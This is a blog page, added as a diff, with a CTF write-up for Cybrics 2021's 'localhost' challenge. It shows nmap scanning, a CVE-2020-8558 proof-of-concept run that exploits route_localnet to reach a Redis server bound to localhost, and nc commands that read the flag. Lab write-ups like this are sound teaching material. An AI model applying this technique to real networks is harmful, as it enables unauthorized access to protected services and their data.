@@ -1,0 +1,292 @@
+<!DOCTYPE html>
+<html lang="en-US">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Cybrics CTF 2021: localhost (267pts, 20 solves)</title>
+  <meta name="description" content="Writeup for Cybrics CTF 2021 localhost">
+  <link rel="canonical" href="https://tlyrs7314.github.io/2021/07/26/CybricsCTF2021-localhost.html">
+  <link rel="alternate" type="application/rss+xml" title="Std0r Feed"
+    href="https://tlyrs7314.github.io/feed.xml">
+  
+  <link rel="shortcut icon" href="/images/favicon.png" type="image/png" />
+  
+  <!-- Styles -->
+  <!--<link href="https://fonts.googleapis.com/css?family=Lato:400,400i,700,700i%7CNoto+Serif:400,400i,700,700i&display=swap" rel="stylesheet">-->
+  <link href="/assets/css/style.css" rel="stylesheet">
+
+  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.13.0/dist/katex.min.css" integrity="sha384-t5CR+zwDAROtph0PXGte6ia8heboACF9R5l/DiY+WZ3P2lxNgvJkQk5n7GPvLMYw" crossorigin="anonymous">
+  <script defer src="https://cdn.jsdelivr.net/npm/katex@0.13.0/dist/katex.min.js" integrity="sha384-FaFLTlohFghEIZkw6VGwmf9ISTubWAVYW8tG8+w2LAIftJEULZABrF9PPFv+tVkH" crossorigin="anonymous"></script>
+  <script defer src="https://cdn.jsdelivr.net/npm/katex@0.13.0/dist/contrib/auto-render.min.js" integrity="sha384-bHBqxz8fokvgoJ/sc17HODNxa42TlaEhB+w8ZJXTc2nZf1VgEaFZeZvT4Mznfz0v" crossorigin="anonymous"
+    onload="renderMathInElement(document.body, { 'delimiters': [
+  {left: '$$', right: '$$', display: true},
+  {left: '$', right: '$', display: false},
+  {left: '\\(', right: '\\)', display: false},
+  {left: '\\begin{equation}', right: '\\end{equation}', display: true},
+  {left: '\\begin{align}', right: '\\end{align}', display: true},
+  {left: '\\begin{alignat}', right: '\\end{alignat}', display: true},
+  {left: '\\begin{gather}', right: '\\end{gather}', display: true},
+  {left: '\\begin{CD}', right: '\\end{CD}', display: true},
+  {left: '\\[', right: '\\]', display: true}
+] });"></script>
+
+</head>
+<body>
+  <div id="bg"></div>
+  <!-- background by SVGBackgrounds.com  -->
+  
+  <div id="page" class="site">
+    <div class="inner">
+      <header class="site-header">
+  
+  <p class="site-title"><a class="logo-text" href="/">Std0r</a></p>
+  
+  <nav class="site-navigation">
+    <div class="site-navigation-wrap">
+      <h2 class="screen-reader-text">Main navigation</h2>
+      <ul class="menu">
+        
+        
+        
+        <li class="menu-item ">
+          <a class="" href="/tags">Tags</a>
+        </li>
+        
+        
+        
+        <li class="menu-item ">
+          <a class="" href="/archive">Archive</a>
+        </li>
+        
+      </ul><!-- .menu -->
+      <button id="menu-close" class="menu-toggle"><span class="screen-reader-text">Close Menu</span><span
+          class="icon-close" aria-hidden="true"></span></button>
+    </div><!-- .site-navigation-wrap -->
+  </nav><!-- .site-navigation -->
+  <button id="menu-open" class="menu-toggle"><span class="screen-reader-text">Open Menu</span><span class="icon-menu" aria-hidden="true"></span></button>
+</header>
+
+
+
+      <main class="main-content fadeInDown delay_075s">
+
+  <article class="post">
+    <header class="post-header">
+      <time class="post-date" datetime="2021-07-26">July 26, 2021</time>
+      <h1 class="post-title">Cybrics CTF 2021: localhost (267pts, 20 solves)</h1>
+      <div class="post-meta">
+        <span class="post-tags"><a href="/tags#ctf" rel="tag">ctf</a>&nbsp;<a href="/tags#ctf-writeups" rel="tag">ctf-writeups</a>&nbsp;<a href="/tags#ctf-web" rel="tag">ctf-web</a></span>
+      </div><!-- .post-meta -->
+      
+      <figure class="post-thumbnail image-card width-wide">
+        <img src="/images/2021-07-26-CybricsCTF2021-localhost/description.png" alt="Cybrics CTF 2021: localhost (267pts, 20 solves)">
+      </figure><!-- .post-thumbnail -->
+      
+    </header><!-- .post-header -->
+    <div class="post-content">
+      <p>Most of the CTF web challenges work on the Application layer. This is the first time I have encountered one that works on the Network layer. It’s quite an inspiring challenge.</p>
+
+<!--more-->
+
+<h1 id="the-challenge">The challenge</h1>
+
+<blockquote>
+  <p>Author: Vlad Roskov (<a href="https://t.me/mrvos">@mrvos</a>)</p>
+
+  <p>Remember NET fleeks? I’ve pwned a box in another corporate network,  and there is some peculiarly configured server near my foothold. Take a  look.</p>
+
+  <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ssh localhost@109.233.61.10
+</code></pre></div>  </div>
+</blockquote>
+
+<h1 id="writeup">Writeup</h1>
+
+<p>According to the description, we should first find the <code class="language-plaintext highlighter-rouge">peculiarly configured server</code>. It was kind of the author to include <code class="language-plaintext highlighter-rouge">nmap</code> for us.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@PWNED:~<span class="nv">$ </span><span class="nb">hostname</span> <span class="nt">-i</span>
+10.193.162.7
+
+root@PWNED:~<span class="nv">$ </span>nmap <span class="nt">-sn</span> 10.193.162.7/24
+Starting Nmap 7.70 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2021-07-25 08:22 UTC
+Nmap scan report <span class="k">for </span>10.193.162.1
+Host is up <span class="o">(</span>0.00013s latency<span class="o">)</span><span class="nb">.</span>
+MAC Address: 02:42:E1:C9:F5:39 <span class="o">(</span>Unknown<span class="o">)</span>
+Nmap scan report <span class="k">for </span>lh_tgt_418.lh_418 <span class="o">(</span>10.193.162.180<span class="o">)</span>
+Host is up <span class="o">(</span>0.000050s latency<span class="o">)</span><span class="nb">.</span>
+MAC Address: 02:42:0A:C1:A2:B4 <span class="o">(</span>Unknown<span class="o">)</span>
+Nmap scan report <span class="k">for </span>PWNED <span class="o">(</span>10.193.162.7<span class="o">)</span>
+Host is up.
+Nmap <span class="k">done</span>: 256 IP addresses <span class="o">(</span>3 hosts up<span class="o">)</span> scanned <span class="k">in </span>3.87 seconds
+</code></pre></div></div>
+
+<p>So we go on to scan <code class="language-plaintext highlighter-rouge">10.193.162.180</code>. The only listening service is HTTP running on port <code class="language-plaintext highlighter-rouge">80</code>. Some config files are hosted there:</p>
+
+<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@PWNED:~$ curl 10.193.162.180
+<span class="nt">&lt;h1&gt;</span>Storage Node Status Page<span class="nt">&lt;/h1&gt;</span>
+<span class="nt">&lt;table</span> <span class="na">border=</span><span class="s">1</span><span class="nt">&gt;</span>
+    <span class="nt">&lt;tr&gt;&lt;td&gt;</span>Records<span class="nt">&lt;/td&gt;&lt;td&gt;</span>1<span class="nt">&lt;/td&gt;&lt;/tr&gt;</span>
+    <span class="nt">&lt;tr&gt;&lt;td&gt;</span>Flag-containing Records<span class="nt">&lt;/td&gt;&lt;td&gt;</span>1<span class="nt">&lt;/td&gt;&lt;/tr&gt;</span>
+    <span class="nt">&lt;tr&gt;&lt;td&gt;</span>Redis Configuration<span class="nt">&lt;/td&gt;&lt;td&gt;</span>Default: <span class="nt">&lt;a</span> <span class="na">href=</span><span class="s">"redis.conf"</span><span class="nt">&gt;</span>redis.conf<span class="nt">&lt;/a&gt;&lt;/td&gt;&lt;/tr&gt;</span>
+    <span class="nt">&lt;tr&gt;&lt;td&gt;</span>System Configuration<span class="nt">&lt;/td&gt;&lt;td&gt;&lt;a</span> <span class="na">href=</span><span class="s">"sysctl.conf"</span><span class="nt">&gt;</span>sysctl.conf<span class="nt">&lt;/a&gt;&lt;/td&gt;&lt;/tr&gt;</span>
+    <span class="nt">&lt;tr&gt;&lt;td&gt;</span>Security<span class="nt">&lt;/td&gt;&lt;td&gt;</span>perfect!<span class="nt">&lt;/td&gt;&lt;/tr&gt;</span>
+<span class="nt">&lt;/table&gt;</span>
+</code></pre></div></div>
+<ul>
+  <li>Filtered content for <code class="language-plaintext highlighter-rouge">http://10.193.162.180/redis.conf</code>:</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">bind </span>127.0.0.1
+protected-mode <span class="nb">yes
+</span>port 6379
+tcp-backlog 511
+<span class="nb">timeout </span>0
+tcp-keepalive 300
+daemonize <span class="nb">yes
+</span>supervised no
+pidfile /var/run/redis/redis-server.pid
+loglevel notice
+logfile /var/log/redis/redis-server.log
+databases 16
+save 900 1
+save 300 10
+save 60 10000
+stop-writes-on-bgsave-error <span class="nb">yes
+</span>rdbcompression <span class="nb">yes
+</span>rdbchecksum <span class="nb">yes
+</span>dbfilename dump.rdb
+<span class="nb">dir</span> /var/lib/redis
+slave-serve-stale-data <span class="nb">yes
+</span>slave-read-only <span class="nb">yes
+</span>repl-diskless-sync no
+repl-diskless-sync-delay 5
+repl-disable-tcp-nodelay no
+slave-priority 100
+appendonly no
+appendfilename <span class="s2">"appendonly.aof"</span>
+appendfsync everysec
+no-appendfsync-on-rewrite no
+auto-aof-rewrite-percentage 100
+auto-aof-rewrite-min-size 64mb
+aof-load-truncated <span class="nb">yes
+</span>lua-time-limit 5000
+slowlog-log-slower-than 10000
+slowlog-max-len 128
+latency-monitor-threshold 0
+notify-keyspace-events <span class="s2">""</span>
+hash-max-ziplist-entries 512
+hash-max-ziplist-value 64
+list-max-ziplist-size <span class="nt">-2</span>
+list-compress-depth 0
+set-max-intset-entries 512
+zset-max-ziplist-entries 128
+zset-max-ziplist-value 64
+hll-sparse-max-bytes 3000
+activerehashing <span class="nb">yes
+</span>client-output-buffer-limit normal 0 0 0
+client-output-buffer-limit slave 256mb 64mb 60
+client-output-buffer-limit pubsub 32mb 8mb 60
+hz 10
+aof-rewrite-incremental-fsync <span class="nb">yes</span>
+</code></pre></div></div>
+
+<ul>
+  <li>Filtered content for <code class="language-plaintext highlighter-rouge">http://10.193.162.180/sysctl.conf</code>:</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>net.ipv4.conf.all.route_localnet<span class="o">=</span>1
+</code></pre></div></div>
+
+<p>By <code class="language-plaintext highlighter-rouge">redis.conf</code> I assume that a redis instance (used for data storage)  is running on <code class="language-plaintext highlighter-rouge">10.193.162.180:6397</code>, but is only accessible locally because of the first line <code class="language-plaintext highlighter-rouge">bind 127.0.0.1</code>. So our goal is to connect to it from the local side. That sounds SSRF-ish, but how do we do that without any proxy or \(``\)admin visit\("\) services?</p>
+
+<p>Upon searching the config in <code class="language-plaintext highlighter-rouge">sysctl.conf</code>, I stumbled on <a href="https://github.com/tabbysable/POC-2020-8558">this detailed article</a>, which suggests that we could pretend to be coming from <code class="language-plaintext highlighter-rouge">127.0.0.1</code> by altering IP packets directly. This does not work all the time, but it is possible in this scenario thanks to the configuration in <code class="language-plaintext highlighter-rouge">sysctl.conf</code>. I then used the testing and PoC scripts provided by the author. Basically, the script captures the traffic sent to a fake address you’ve specified, modifies it and send the payload to the victim server.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>python3 poc.py <span class="nt">--fakedestination</span> 10.193.162.1 10.193.162.180 &amp;
+</code></pre></div></div>
+
+<p>Normally you would want to use <code class="language-plaintext highlighter-rouge">redis-cli</code> to connect to redis. But since the protocol can be handcrafted easily, I just used <code class="language-plaintext highlighter-rouge">nc</code> for this.</p>
+
+<p>Command: <code class="language-plaintext highlighter-rouge">KEYS *</code></p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@PWNED:~/<span class="nv">$ </span><span class="nb">echo</span> <span class="nt">-e</span> <span class="s1">'*2\r\n$4\r\nKEYS\r\n$1\r\n*\r\n'</span> | nc 10.193.162.1 6379
+<span class="k">*</span>1
+<span class="nv">$33</span>
+flag_is_here_iedie8Ee5eniequ4uNie
+</code></pre></div></div>
+
+<p>Command: <code class="language-plaintext highlighter-rouge">GET flag_is_here_iedie8Ee5eniequ4uNie</code></p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@PWNED:~/<span class="nv">$ </span><span class="nb">echo</span> <span class="nt">-e</span> <span class="s1">'*2\r\n$3\r\nGET\r\n$33\r\nflag_is_here_iedie8Ee5eniequ4uNie\r\n*\r\n'</span> | nc 10.193.162.1 6379
+<span class="nv">$61</span>
+cybrics<span class="o">{</span>m05T_C0mm0N_s3CuR1tY_m34SuRe_4nD_L34St_c0MmoN_sysctl<span class="o">}</span>
+</code></pre></div></div>
+
+<p>flag: <code class="language-plaintext highlighter-rouge">cybrics{m05T_C0mm0N_s3CuR1tY_m34SuRe_4nD_L34St_c0MmoN_sysctl}</code></p>
+
+<h1 id="references">References</h1>
+
+<ol>
+  <li><a href="https://github.com/tabbysable/POC-2020-8558">https://github.com/tabbysable/POC-2020-8558</a></li>
+  <li><a href="https://www.compose.com/articles/how-to-talk-raw-redis/">https://www.compose.com/articles/how-to-talk-raw-redis/</a></li>
+</ol>
+
+    </div><!-- .post-content -->
+    <div class="post-share">
+      <span>Share:</span>
+      <a target="_blank"
+        href="https://twitter.com/intent/tweet?text=Cybrics%20CTF%202021:%20localhost%20(267pts,%2020%20solves)&amp;url=https://tlyrs7314.github.io/2021/07/26/CybricsCTF2021-localhost.html" rel="noopener">Twitter</a>
+    </div><!-- .share-post -->
+  </article><!-- .post -->
+
+  
+
+</main><!-- .main-content -->
+
+      <footer class="site-footer">
+  <div class="offsite-links">
+    
+      
+<a href="https://github.com/tlyrs7314" target="_blank" rel="noopener">
+  <span class="fa-github" aria-hidden="true"></span>
+  <span class="screen-reader-text">GitHub</span>
+</a>
+
+<a href="/feed.xml" target="_blank" rel="noopener">
+  <span class="fa-rss" aria-hidden="true"></span>
+  <span class="screen-reader-text">RSS</span>
+</a>
+
+    
+  </div><!-- .offsite-links -->
+  <div class="footer-bottom">
+    <div class="site-info">
+      <p>© Stdor 2021. Theme adapted from <a href="https://justgoodthemes.com/ghost-themes/scriptor">Scriptor</a>.</p>
+
+    </div><!-- .site-info -->
+    <a href="#page" id="back-to-top" class="back-to-top"><span class="screen-reader-text">Back to the top </span>&#8593;</a>
+  </div><!-- .footer-bottom -->
+</footer><!-- .site-footer -->
+
+    </div><!-- .inner -->
+  </div><!-- .site -->
+
+  <!-- Scripts -->
+  
+  <script src="/assets/js/plugins.js"></script>
+  <script src="/assets/js/custom.js"></script>
+  <script>
+	// Add anchors on DOMContentLoaded
+	document.addEventListener('DOMContentLoaded', function(event) {
+	  anchors.add('h1:not(.post-title), h2:not(.post-title), h3, h4, h5, h6');
+	  anchors.remove('.site-title');
+	});
+	
+	// Adjust background opacity
+	var f = function(){
+		bg.style.opacity = Math.random()*0.2 + 0.05;
+	};
+	f();
+	setInterval(f, 5000);
+  </script>
+
+</body>
+</html>
